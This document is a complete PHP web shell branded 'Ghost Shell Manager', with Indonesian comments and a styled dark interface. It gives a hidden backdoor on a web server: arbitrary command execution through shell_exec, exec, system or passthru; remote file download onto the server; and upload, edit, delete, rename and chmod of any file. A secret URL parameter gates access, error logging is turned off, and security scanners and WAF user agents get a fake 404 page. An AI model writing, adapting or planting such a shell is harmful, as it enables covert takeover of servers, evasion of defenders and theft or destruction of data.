<?php
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@error_reporting(0);
header('X-Powered-By: ');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Pragma: no-cache');

/* Ghost Shell - Final Polish Edition */

session_start();

// 1. Fake User-Agent detection (block scanner/WAF)
$blocked_agents = [
    'modsecurity', 'cloudflare', 'waf', 'bot', 'crawler', 
    'scanner', 'nmap', 'sqlmap', 'nikto', 'wpscan', 'wordfence',
    'burp', 'zap', 'acunetix', 'nessus', 'openvas'
];
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
foreach ($blocked_agents as $bad) {
    if (stripos($ua, $bad) !== false) {
        http_response_code(404);
        echo "<!DOCTYPE html><html><head><title>404 Not Found</title></head>";
        echo "<body style='background:#0a0a0a; color:#ccc; text-align:center; padding:50px;'>";
        echo "<h1 style='color:#ff4444'>404 Not Found</h1>";
        echo "<p>The requested URL was not found on this server.</p>";
        echo "</body></html>";
        exit();
    }
}

// === Aktifasi ===
if (isset($_GET['x']) && $_GET['x'] === 'ghost') {
    if (isset($_GET['d'])) @chdir($_GET['d']);
    $pwd = getcwd();
    $list = scandir($pwd);
} else {
    die('<!-- access restricted -->');
}

// === Fungsi ===
function formatSize($bytes) {
    if ($bytes === false || $bytes === null) return '? B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < 4) { $bytes /= 1024; $i++; }
    return round($bytes, 2) . ' ' . $units[$i];
}

function getPerms($path) {
    if (!file_exists($path)) return '---';
    $perms = fileperms($path);
    if ($perms === false) return '---';
    return substr(sprintf('%o', $perms), -4);
}

function getBreadcrumb($path) {
    $parts = explode('/', trim($path, '/'));
    $breadcrumb = [];
    $accum = '';
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $accum .= '/' . $part;
        $breadcrumb[] = ['name' => $part, 'path' => $accum];
    }
    return $breadcrumb;
}

// === Navigasi History ===
if (!isset($_SESSION['dir_history'])) {
    $_SESSION['dir_history'] = [];
}

// === Working Directory ===
if (isset($_GET['d'])) {
    $newDir = realpath($_GET['d']);
    if ($newDir && is_dir($newDir)) {
        // Simpan history sebelum pindah
        $oldDir = getcwd();
        if ($oldDir && !in_array($oldDir, $_SESSION['dir_history'])) {
            array_unshift($_SESSION['dir_history'], $oldDir);
        }
        chdir($newDir);
        $_SESSION['ghost_cwd'] = $newDir;
    }
}
$cwd = isset($_SESSION['ghost_cwd']) && is_dir($_SESSION['ghost_cwd']) ? $_SESSION['ghost_cwd'] : getcwd();
chdir($cwd);
$cwd = getcwd();
$files = scandir($cwd);

// Batasi history maksimal 15
$_SESSION['dir_history'] = array_slice($_SESSION['dir_history'], 0, 15);

// === Owner & Group Info ===
$owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($cwd))['name'] : 'www-data';
$group = function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($cwd))['name'] : 'www-data';

// === Handle POST Actions ===
$msg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Upload file
    if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
        $tmp = $_FILES['upload_file']['tmp_name'];
        $name = preg_replace('/[^a-zA-Z0-9_\.-]/', '_', basename($_FILES['upload_file']['name']));
        $dest = $cwd . '/' . $name;
        if (move_uploaded_file($tmp, $dest)) {
            $msg = "<span class='success'>✓ Upload sukses: " . htmlspecialchars($name) . "</span>";
        } else {
            $msg = "<span class='error'>✗ Upload gagal</span>";
        }
    }
    
    // Remote download via URL
    if (isset($_POST['url_download']) && !empty($_POST['url_download'])) {
        $url = $_POST['url_download'];
        $filename = !empty($_POST['filename']) ? basename($_POST['filename']) : basename(parse_url($url, PHP_URL_PATH));
        if (empty($filename)) $filename = 'downloaded_file';
        $filename = preg_replace('/[^a-zA-Z0-9_\.-]/', '_', $filename);
        $dest = $cwd . '/' . $filename;
        
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $data = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($httpCode == 200 && $data && file_put_contents($dest, $data)) {
            $msg = "<span class='success'>✓ Download sukses: " . htmlspecialchars($filename) . "</span>";
        } else {
            $msg = "<span class='error'>✗ Gagal download dari URL</span>";
        }
    }
    
    // Actions via act parameter
    if (isset($_POST['act'])) {
        switch($_POST['act']) {
            case 'mkdir':
                $folder = preg_replace('/[^a-zA-Z0-9_\.-]/', '_', basename($_POST['folder']));
                $newDir = $cwd . '/' . $folder;
                if (!is_dir($newDir)) {
                    mkdir($newDir, 0755, true);
                    $msg = "<span class='success'>✓ Folder dibuat: $folder</span>";
                } else {
                    $msg = "<span class='error'>✗ Folder sudah ada</span>";
                }
                break;
            case 'mkfile':
                $file = preg_replace('/[^a-zA-Z0-9_\.-]/', '_', basename($_POST['file']));
                $newFile = $cwd . '/' . $file;
                if (!file_exists($newFile)) {
                    file_put_contents($newFile, '');
                    $msg = "<span class='success'>✓ File dibuat: $file</span>";
                } else {
                    $msg = "<span class='error'>✗ File sudah ada</span>";
                }
                break;
            case 'rename':
                if (isset($_POST['src'], $_POST['dst'])) {
                    $src = $_POST['src'];
                    $dstName = preg_replace('/[^a-zA-Z0-9_\.-]/', '_', basename($_POST['dst']));
                    $dst = dirname($src) . '/' . $dstName;
                    if (file_exists($src) && rename($src, $dst)) {
                        $msg = "<span class='success'>✓ Rename sukses</span>";
                    } else {
                        $msg = "<span class='error'>✗ Gagal rename</span>";
                    }
                }
                break;
            case 'edit':
                if (isset($_POST['src'], $_POST['dat'])) {
                    if (file_put_contents($_POST['src'], $_POST['dat'])) {
                        $msg = "<span class='success'>✓ File tersimpan</span>";
                    } else {
                        $msg = "<span class='error'>✗ Gagal menyimpan</span>";
                    }
                }
                break;
            case 'chmod':
                if (isset($_POST['src'], $_POST['perm'])) {
                    $perm = octdec(preg_replace('/[^0-7]/', '', $_POST['perm']));
                    if (chmod($_POST['src'], $perm)) {
                        $msg = "<span class='success'>✓ Chmod " . decoct($perm) . " applied</span>";
                    } else {
                        $msg = "<span class='error'>✗ Gagal chmod</span>";
                    }
                }
                break;
        }
    }
}

// === Delete via GET ===
if (isset($_GET['rm'])) {
    $target = $_GET['rm'];
    if (file_exists($target)) {
        if (is_dir($target)) {
            @rmdir($target);
        } else {
            @unlink($target);
        }
        $msg = "<span class='success'>✓ Deleted</span>";
    } else {
        $msg = "<span class='error'>✗ Tidak ditemukan</span>";
    }
}

// === Terminal Command ===
$cmd_output = '';
if (isset($_POST['cmd']) && $_POST['cmd'] !== '') {
    $cmd = $_POST['cmd'];
    $funcs = ['shell_exec', 'exec', 'system', 'passthru'];
    foreach ($funcs as $func) {
        if (function_exists($func)) {
            if ($func === 'exec') {
                exec($cmd . ' 2>&1', $out);
                $cmd_output = implode("\n", $out);
            } else {
                $cmd_output = @$func($cmd . ' 2>&1');
            }
            break;
        }
    }
    if (!$cmd_output) $cmd_output = "Command execution disabled";
}

// === Get file info for table ===
$fileList = [];
foreach ($files as $f) {
    if ($f === '.' || $f === '..') continue;
    $path = $cwd . '/' . $f;
    $isDir = is_dir($path);
    $fileList[] = [
        'name' => $f,
        'path' => $path,
        'type' => $isDir ? 'dir' : 'file',
        'size' => $isDir ? '📁 DIR' : formatSize(filesize($path)),
        'modify' => date('Y-m-d H:i:s', filemtime($path)),
        'owner' => function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($path))['name'] : 'www-data',
        'group' => function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($path))['name'] : 'www-data',
        'perms' => getPerms($path),
    ];
}

// Untuk form rename/edit/chmod
$rename_file = isset($_GET['r']) && file_exists($_GET['r']) ? $_GET['r'] : null;
$edit_file = isset($_GET['e']) && is_file($_GET['e']) ? $_GET['e'] : null;
$chmod_target = isset($_GET['cm']) && file_exists($_GET['cm']) ? $_GET['cm'] : null;
$edit_content = $edit_file ? htmlspecialchars(file_get_contents($edit_file)) : '';

// Breadcrumb
$breadcrumbs = getBreadcrumb($cwd);
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>GHOST SHELL V1.0</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0418;
            background-image: radial-gradient(circle at 15% 30%, rgba(96, 65, 165, 0.15) 0%, #0a0418 90%);
            font-family: 'Inter', 'Segoe UI', 'Courier New', monospace;
            color: #eceaff;
            padding: 28px 32px;
        }

        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('https://githack.space/ghost-shell/666/ghoshell.png');
            background-size: cover;      
            background-position: center; 
            background-repeat: no-repeat; 
            pointer-events: none;
            z-index: 0;
            opacity: 0.2;           
        }

        .app-container {
            max-width: 1600px;
            margin: 0 auto;
            position: relative;
            z-index: 2;
        }

        /* Navigasi Bar */
        .nav-bar {
            background: rgba(15, 10, 30, 0.8);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 12px 20px;
            margin-bottom: 25px;
            border: 1px solid #3a2a6e;
        }

        .nav-row {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 12px;
            margin-bottom: 10px;
        }

        .nav-row:last-child {
            margin-bottom: 0;
        }

        .nav-btn {
            background: #2c204c;
            padding: 6px 16px;
            border-radius: 30px;
            text-decoration: none;
            color: #c6adff;
            font-size: 0.75rem;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            transition: 0.2s;
            border: none;
            cursor: pointer;
        }

        .nav-btn:hover {
            background: #5c40a0;
            color: white;
            transform: translateY(-1px);
        }

        .nav-btn-primary {
            background: #4a3690;
            color: white;
        }

        .breadcrumb {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 5px;
            font-family: monospace;
            font-size: 0.8rem;
            background: #1a1236;
            padding: 8px 16px;
            border-radius: 40px;
            flex: 1;
        }

        .breadcrumb a {
            color: #cdb4ff;
            text-decoration: none;
        }

        .breadcrumb a:hover {
            color: #ff99ff;
            text-decoration: underline;
        }

        .breadcrumb span {
            color: #6a5a8a;
        }

        .history-select {
            background: #2c204c;
            border: none;
            padding: 6px 12px;
            border-radius: 30px;
            color: #c6adff;
            font-size: 0.75rem;
            cursor: pointer;
        }

        .current-path-badge {
            font-family: monospace;
            background: #0c0820;
            padding: 6px 14px;
            border-radius: 30px;
            font-size: 0.7rem;
            color: #bb99ff;
            word-break: break-all;
        }

        .cyber-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 25px;
            border-bottom: 2px solid #3c2a6e;
            padding-bottom: 20px;
        }

        .brand h1 {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(135deg, #c58aff, #9b6dff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -1px;
            font-family: 'Courier New', monospace;
        }

        .brand span {
            font-size: 0.65rem;
            color: #8f7bcb;
            letter-spacing: 2px;
            text-transform: uppercase;
            margin-top: 4px;
        }

        .info-strip {
            background: #0c0820cc;
            border-radius: 24px;
            padding: 12px 20px;
            margin-bottom: 25px;
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            gap: 12px;
            font-size: 0.75rem;
            border-left: 4px solid #b77eff;
            backdrop-filter: blur(4px);
        }

        .quick-links {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
        }

        .quick-links a {
            color: #bb9eff;
            text-decoration: none;
            padding: 3px 10px;
            background: #1b1236;
            border-radius: 20px;
            font-size: 0.7rem;
        }

        .quick-links a:hover {
            background: #4a3690;
            color: white;
        }

        .perm-badge {
            font-family: monospace;
            background: #1b1236;
            padding: 4px 12px;
            border-radius: 30px;
            color: #bb9eff;
            font-size: 0.7rem;
        }

        .glass-panel {
            background: #0f0a1ed4;
            backdrop-filter: blur(12px);
            border: 1px solid #2f2352;
            border-radius: 28px;
            margin-bottom: 28px;
            overflow: hidden;
        }

        .panel-header {
            padding: 18px 24px 8px 24px;
            font-weight: 600;
            font-size: 0.75rem;
            letter-spacing: 2px;
            text-transform: uppercase;
            color: #b388ff;
            border-bottom: 1px solid #2a1f48;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .panel-body {
            padding: 20px 24px;
        }

        .file-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.8rem;
            font-family: 'JetBrains Mono', 'Courier New', monospace;
        }

        .file-table th {
            text-align: left;
            padding: 12px 10px;
            background: #090614;
            color: #bd9eff;
            font-weight: 500;
            border-bottom: 1px solid #352b55;
            font-size: 0.75rem;
        }

        .file-table td {
            padding: 10px 10px;
            border-bottom: 1px solid #221e3a;
            vertical-align: middle;
        }

        .file-table tr:hover td {
            background: #181229;
        }

        .file-icon a {
            color: #bb99ff;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .file-icon a:hover {
            color: #dbbcff;
            text-decoration: underline;
        }

        .action-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
        }

        .action-buttons a {
            background: #1f173a;
            padding: 3px 10px;
            border-radius: 30px;
            font-size: 0.65rem;
            text-decoration: none;
            color: #c6adff;
            transition: 0.1s;
        }

        .action-buttons a:hover {
            background: #4a3690;
            color: white;
        }

        .tools-bar {
            display: flex;
            flex-wrap: wrap;
            gap: 16px;
            margin-bottom: 20px;
        }

        .tool-card {
            flex: 1;
            min-width: 200px;
            background: #0b071a;
            border-radius: 18px;
            padding: 14px 18px;
            border: 1px solid #322a54;
        }

        .tool-card label {
            font-size: 0.65rem;
            text-transform: uppercase;
            color: #9b7edb;
            display: block;
            margin-bottom: 10px;
            letter-spacing: 1px;
        }

        .input-group {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            align-items: center;
        }

        input, select, textarea, button {
            background: #0c071c;
            border: 1px solid #392f60;
            padding: 8px 12px;
            border-radius: 14px;
            color: #efecff;
            font-size: 0.8rem;
            font-family: monospace;
            outline: none;
        }

        input:focus, textarea:focus {
            border-color: #ab8aff;
            box-shadow: 0 0 0 2px #5f3fbf40;
        }

        button {
            background: #2c204c;
            cursor: pointer;
            font-weight: 500;
            transition: 0.1s;
        }

        button:hover {
            background: #5c40a0;
            border-color: #c096ff;
        }

        .terminal {
            background: #05020f;
            border-radius: 18px;
            padding: 16px;
            font-family: monospace;
            font-size: 0.8rem;
            color: #b5f0b5;
            white-space: pre-wrap;
            border: 1px solid #3d2d66;
            max-height: 320px;
            overflow: auto;
        }

        .msg {
            background: #201c3a;
            border-radius: 18px;
            padding: 10px 20px;
            margin-bottom: 22px;
            border-left: 4px solid #aa7eff;
            font-size: 0.8rem;
        }

        .success {
            color: #bbf07a;
        }
        .error {
            color: #ff9898;
        }

        hr {
            border-color: #2e2352;
            margin: 25px 0;
        }

        .footer-note {
            text-align: center;
            font-size: 0.65rem;
            padding: 16px;
            color: #5c4c8c;
        }

        .scroll-x {
            overflow-x: auto;
        }

        @media (max-width: 900px) {
            body { padding: 15px; }
            .panel-body { padding: 14px; }
            .tools-bar { flex-direction: column; }
            .nav-row { flex-direction: column; align-items: stretch; }
            .breadcrumb { overflow-x: auto; }
        }
    </style>
</head>
<body>
<div class="app-container">

    <!-- HEADER -->
    <div class="cyber-header">
        <div class="brand">
            <h1>👻 GHOST SHELL MANAGER</h1>
            <span>SECURE · WIDE EDITION · v1.0</span>
        </div>
        <div class="current-path-badge">
            📂 <?= htmlspecialchars($cwd) ?>
        </div>
    </div>

    <!-- NAVIGATION BAR - LENGKAP -->
    <div class="nav-bar">
        <div class="nav-row">
            <!-- Tombol Navigasi Utama -->
            <a href="?x=ghost&d=/" class="nav-btn nav-btn-primary">🏠 ROOT (/)</a>
            <a href="?x=ghost&d=<?= urlencode(dirname($cwd)) ?>" class="nav-btn">⬆ UP LEVEL</a>
            <a href="?x=ghost&d=<?= urlencode($_SERVER['DOCUMENT_ROOT'] ?? '/') ?>" class="nav-btn">📁 DOC ROOT</a>
            <a href="?x=ghost&d=<?= urlencode($cwd) ?>" class="nav-btn">🔄 REFRESH</a>
            
            <!-- History Dropdown -->
            <?php if (!empty($_SESSION['dir_history'])): ?>
            <select class="history-select" onchange="if(this.value) window.location.href='?x=ghost&d='+encodeURIComponent(this.value)">
                <option value="">📜 HISTORY (<?= count($_SESSION['dir_history']) ?>)</option>
                <?php foreach ($_SESSION['dir_history'] as $hist): ?>
                    <option value="<?= htmlspecialchars($hist) ?>"><?= htmlspecialchars($hist) ?></option>
                <?php endforeach; ?>
            </select>
            <?php endif; ?>
        </div>
        
        <div class="nav-row">
            <!-- Breadcrumb Navigation -->
            <div class="breadcrumb">
                <a href="?x=ghost&d=/">🏠</a>
                <?php foreach ($breadcrumbs as $bc): ?>
                    <span>›</span>
                    <a href="?x=ghost&d=<?= urlencode($bc['path']) ?>"><?= htmlspecialchars($bc['name']) ?></a>
                <?php endforeach; ?>
            </div>
        </div>
    </div>

    <!-- INFO STRIP dengan Quick Links -->
    <div class="info-strip">
        <div>⚡ OWNER: <strong><?= htmlspecialchars($owner) ?></strong> | GROUP: <strong><?= htmlspecialchars($group) ?></strong></div>
        <div class="quick-links">
            <a href="?x=ghost&d=/">🏠 /</a>
            <a href="?x=ghost&d=/home">🏠 /home</a>
            <a href="?x=ghost&d=/var/www">📁 /var/www</a>
            <a href="?x=ghost&d=/tmp">📦 /tmp</a>
            <a href="?x=ghost&d=/etc">⚙️ /etc</a>
            <a href="?x=ghost&d=<?= urlencode($_SERVER['DOCUMENT_ROOT'] ?? '/') ?>">🌐 public_html</a>
        </div>
        <div class="perm-badge">🛡️ UMASK 0755 | SAFE MODE: OFF</div>
    </div>

    <?php if ($msg): ?>
    <div class="msg"><?= $msg ?></div>
    <?php endif; ?>

    <!-- TERMINAL -->
    <div class="glass-panel">
        <div class="panel-header">⚡ EXECUTE · COMMAND LINE</div>
        <div class="panel-body">
            <form method="POST" style="display: flex; gap: 12px; margin-bottom: 18px; flex-wrap: wrap;">
                <input type="text" name="cmd" placeholder="$ masukkan perintah (ls, pwd, whoami, id, cat file.txt)" style="flex:1; font-family: monospace;">
                <button type="submit">▶ RUN</button>
            </form>
            <div class="terminal"><?= htmlspecialchars($cmd_output ?: "Ghost shell ready. ~ " . $cwd) ?></div>
        </div>
    </div>

    <!-- TOOLS -->
    <div class="glass-panel">
        <div class="panel-header">🛠️ TOOLS · FILE OPS</div>
        <div class="panel-body">
            <div class="tools-bar">
                <div class="tool-card">
                    <label>📤 UPLOAD FILE</label>
                    <form method="POST" enctype="multipart/form-data" class="input-group">
                        <input type="file" name="upload_file" style="flex:2">
                        <button type="submit">upload</button>
                    </form>
                </div>
                <div class="tool-card">
                    <label>🌐 REMOTE GET (URL)</label>
                    <form method="POST" style="display: flex; flex-direction: column; gap: 8px;">
                        <div style="display: flex; gap: 8px; flex-wrap: wrap;">
                            <input type="text" name="url_download" placeholder="https://example.com/file.zip" style="flex:2">
                            <input type="text" name="filename" placeholder="nama_file" style="flex:1">
                        </div>
                        <button type="submit">⬇ download to server</button>
                    </form>
                </div>
                <div class="tool-card">
                    <label>📁 CREATE</label>
                    <div style="display: flex; gap: 8px; flex-wrap: wrap;">
                        <form method="POST" style="display: flex; gap: 6px;">
                            <input type="hidden" name="act" value="mkdir">
                            <input type="text" name="folder" placeholder="folder_baru">
                            <button type="submit">+ DIR</button>
                        </form>
                        <form method="POST" style="display: flex; gap: 6px;">
                            <input type="hidden" name="act" value="mkfile">
                            <input type="text" name="file" placeholder="file.txt">
                            <button type="submit">+ FILE</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- FILE MANAGER TABLE -->
    <div class="glass-panel">
        <div class="panel-header">📄 FILE MANAGER · <?= htmlspecialchars(basename($cwd)) ?></div>
        <div class="panel-body scroll-x">
            <table class="file-table">
                <thead>
                    <tr><th>NAME</th><th>SIZE</th><th>MODIFY</th><th>OWNER/GROUP</th><th>PERMS</th><th>ACTIONS</th></tr>
                </thead>
                <tbody>
                    <?php if ($cwd !== '/'): ?>
                    <tr>
                        <td class="file-icon"><a href="?x=ghost&d=<?= urlencode(dirname($cwd)) ?>">🔙 .. (Parent Directory)</a></td>
                        <td>-</td><td>-</td><td>-</td><td>-</td><td>-</td>
                    </tr>
                    <?php endif; ?>
                    <?php foreach ($fileList as $item): ?>
                    <tr>
                        <td class="file-icon">
                            <?php if ($item['type'] === 'dir'): ?>
                                <a href="?x=ghost&d=<?= urlencode($item['path']) ?>">📁 <?= htmlspecialchars($item['name']) ?></a>
                            <?php else: ?>
                                📄 <?= htmlspecialchars($item['name']) ?>
                            <?php endif; ?>
                        </td>
                        <td><?= htmlspecialchars($item['size']) ?></td>
                        <td><?= htmlspecialchars($item['modify']) ?></td>
                        <td><?= htmlspecialchars($item['owner']) ?>/<?= htmlspecialchars($item['group']) ?></td>
                        <td><?= htmlspecialchars($item['perms']) ?></td>
                        <td class="action-buttons">
                            <a href="?x=ghost&rm=<?= urlencode($item['path']) ?>" onclick="return confirm('Hapus permanen?')">🗑 del</a>
                            <a href="?x=ghost&r=<?= urlencode($item['path']) ?>">✏️ rename</a>
                            <?php if ($item['type'] === 'file'): ?>
                            <a href="?x=ghost&e=<?= urlencode($item['path']) ?>">📝 edit</a>
                            <?php endif; ?>
                            <a href="?x=ghost&cm=<?= urlencode($item['path']) ?>">🔐 chmod</a>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>

    <!-- RENAME FORM -->
    <?php if ($rename_file): ?>
    <div class="glass-panel">
        <div class="panel-header">✏️ RENAME</div>
        <div class="panel-body">
            <form method="POST">
                <input type="hidden" name="act" value="rename">
                <div class="input-group" style="flex-wrap: wrap;">
                    <input type="text" name="src" value="<?= htmlspecialchars($rename_file) ?>" style="flex:2">
                    <input type="text" name="dst" placeholder="new_name" value="<?= htmlspecialchars(basename($rename_file)) ?>" style="flex:1">
                    <button type="submit">RENAME</button>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>

    <!-- EDIT FORM -->
    <?php if ($edit_file): ?>
    <div class="glass-panel">
        <div class="panel-header">✍️ EDIT FILE · <?= htmlspecialchars(basename($edit_file)) ?></div>
        <div class="panel-body">
            <form method="POST">
                <input type="hidden" name="act" value="edit">
                <input type="hidden" name="src" value="<?= htmlspecialchars($edit_file) ?>">
                <textarea name="dat" rows="12" style="width:100%; background:#0c071c; border-radius: 16px; padding: 14px; font-family: monospace; font-size: 0.8rem;"><?= $edit_content ?></textarea>
                <button type="submit" style="margin-top: 14px;">💾 SAVE CHANGES</button>
            </form>
        </div>
    </div>
    <?php endif; ?>

    <!-- CHMOD FORM -->
    <?php if ($chmod_target): ?>
    <div class="glass-panel">
        <div class="panel-header">🔒 CHMOD</div>
        <div class="panel-body">
            <form method="POST">
                <input type="hidden" name="act" value="chmod">
                <div class="input-group">
                    <input type="text" name="src" value="<?= htmlspecialchars($chmod_target) ?>" style="flex:2">
                    <input type="text" name="perm" placeholder="0755" value="0755" style="width: 100px;">
                    <button type="submit">APPLY</button>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>

    <hr>
    <div class="footer-note">
        GHOST SHELL MANAGER · REAL FILE SYSTEM · <?= date('Y') ?> · <a href="?x=ghost&d=/" style="color:#6a5a8a;">🏠 Root</a>
    </div>
</div>
</body>
</html>
